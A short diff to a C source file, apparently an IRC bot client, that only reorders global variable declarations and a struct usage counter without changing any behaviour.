@@ -349,6 +349,17 @@ desList* des;
 int main_pid, masterSz, safeSz, shitSz, desSz, threadSz;
 int port, threads, delay, scatter, numBots, banWait, conWait, randGreet, startTime;
 
+// Declare global variables using the same length constraints
+char username[MAX_USERNAME_LEN];
+char password[MAX_PASSWORD_LEN];
+char server[MAX_SERVER_LEN];
+char bindaddr[MAX_BINDADDR_LEN];
+char channel[MAX_CHANNEL_LEN];
+char trigger[MAX_TRIGGER_LEN];
+char backup[MAX_BACKUP_LEN];
+char topic[MAX_TOPIC_LEN];
+char tag[MAX_TAG_LEN];
+
 struct data {
     time_t lastTime;
     unsigned int flood;
@@ -365,21 +376,8 @@ struct data {
     char logonPacket[MAX_LOGON_PACKET_LEN];
     char currChan[MAX_CHANNEL_LEN];
 };
-
-struct rusage r_usage;  // Keep this unchanged
-
-// Declare global variables using the same length constraints
-char username[MAX_USERNAME_LEN];
-char password[MAX_PASSWORD_LEN];
-char server[MAX_SERVER_LEN];
-char bindaddr[MAX_BINDADDR_LEN];
-char channel[MAX_CHANNEL_LEN];
-char trigger[MAX_TRIGGER_LEN];
-char backup[MAX_BACKUP_LEN];
-char topic[MAX_TOPIC_LEN];
-char tag[MAX_TAG_LEN];
-
 struct data *pb;
+struct rusage r_usage;  // Keep this unchanged
 
 #if !defined(WINDOWS_CPP_BUILD)
 
